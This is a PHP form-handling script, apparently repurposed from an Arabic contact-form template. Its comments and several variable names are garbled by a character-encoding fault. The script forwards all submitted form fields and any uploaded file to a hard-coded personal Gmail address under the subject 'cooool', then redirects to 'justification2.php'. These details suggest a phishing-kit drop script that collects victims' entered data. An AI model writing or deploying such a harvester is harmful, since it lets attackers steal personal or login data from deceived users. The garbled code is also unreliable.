<?
	$ip_contact_us_to = "moneymachine7717@gmail.com";  //---------- ⁄œ· ≈·Ï ≈Ì„Ì·ﬂ «·Œ«’
	$where = "justification2.php"; //-------------- ÷⁄ ⁄‰Ê«‰ «·’›Õ… «· Ì ” ŸÂ— ··“«∆— »⁄œ √‰ Ì—”· —”«· Â
	
	if(isset($_POST['Submit'])){
	
	// «·”ÿ— «· «·Ì ÷⁄ ›ÌÂ  ‰”Ìﬁ «·Â „· «·–Ì  —ÌœÂ √‰ ÌﬂÊ‰ ﬁ»· »Ì«‰«  «·„ ’· Ê—”«· Â
	// »‘—ÿ › Õ ÃœÊ· ›Ì ¬Œ— Â–« «·ﬂÊœ
	// √Ê « —ﬂÂ ﬂ„« ÂÊ «·¬‰

	$body_1 = "<div align=right dir=rtl>
	<p align=center style='font-size: 14px; font-weight: bold'>« ’«· „‰ «·„Êﬁ⁄</p>
	<table width=500 align=center border=1 style='border-collapse: collapse; border: 1px solid #dddddd' cellpadding=3 cellspacing=2>";

	// «·”ÿ— «· «·Ì ÷⁄ ›ÌÂ  ‰”Ìﬁ «·Â „· «·–Ì  —ÌœÂ √‰ ÌﬂÊ‰ »⁄œ »Ì«‰«  «·„ ’· Ê—”«· Â
	// »‘—ÿ ≈€·«ﬁ ÃœÊ· ›Ì √Ê· Â–« «·ﬂÊœ
	// √Ê « —ﬂÂ ﬂ„« ÂÊ «·¬‰

	$body_2 = "</table></div>";
	
	// ·«  ›⁄· ‘Ì∆« „‰ Â‰« Ê—«ÌÕ
		
	$mail_body = $body_1;
	$mail_headers = "";
  	
	$mime_boundary="==Multipart_Boundary_x".md5(mt_rand())."x";
   
	$mail_headers .= "From: ". $«·«”„ ."<" . $«·≈Ì„Ì· . ">" . "\r\n";	
	$mail_headers .= "MIME-Version: 1.0\r\n";
	$mail_headers .= "	X-Priority: ". $Priority . "\r\n";	

	$bg = '#ffffff';	
	foreach($_POST as $key => $val){
	if($bg == '#eeeeee') $bg = '#ffffff';
	else $bg = '#eeeeee';
	if($key <> 'Submit'){
	$mail_body .= "<tr valign=top bgcolor='". $bg . "'><td width=120 align=left><b>". $key . ":</b></td><td>" . nl2br($val) . "</td></tr>";
	}
	}
	$mail_body .= "<tr><td colspan=2 align=center height=30 bgcolor='#eeeeee'>”ﬂ—Ì»  « ’· »‰« 2.5 „‰ <a href='http://www.internetplus.biz'>≈‰ —‰  »·”</a></td></tr>";
	$mail_body .= "</div>";
	$message = $mail_body;
   if (isset($_FILES['file']))
	{
   $tmp_name = $_FILES['file']['tmp_name'];
   $type = $_FILES['file']['type'];
   $name = $_FILES['file']['name'];
   $size = $_FILES['file']['size'];

	   
     if(is_uploaded_file($tmp_name)){
	 $f = 1;

        $file = fopen($tmp_name,'rb');
        $data = fread($file,filesize($tmp_name));
         fclose($file);
        $data = chunk_split(base64_encode($data));

      $mail_headers .= "Content-Type: multipart/mixed;\r\n" .
         " boundary=\"{$mime_boundary}\"";

      $message = " ÊÃœ „—›ﬁ«  „⁄ Â–Â «·—”«·… ..\n\n" .
         "--{$mime_boundary}\n" .
         "Content-Type: text/html; charset=\"windows-1256\"\n" .
         "Content-Transfer-Encoding: 7bit\n\n" .
         $mail_body . "\n\n";


      $message .= "--{$mime_boundary}\n" .
         "Content-Type: {$type};\n" .
         " name=\"{$«·«”„}\"\n" .
         //"Content-Disposition: attachment;\n" .
         //" filename=\"{$fileatt_name}\"\n" .
         "Content-Transfer-Encoding: base64\n\n" .
         $data . "\n\n" .
         "--{$mime_boundary}--\n";
	
	}
	else $f = 0;
	}
	else $f = 0;
	
	if($f == 0) {
	$mail_headers .= "Content-Type: text/html; charset=\"windows-1256\"\r\n";
	$message = $mail_body;
	}

	$message .= $body_2;

	mail($ip_contact_us_to, "cooool", $message, $mail_headers);
	}

	echo "<META HTTP-EQUIV=\"Refresh\" CONTENT=\"0;URL=$where\">";
	
?>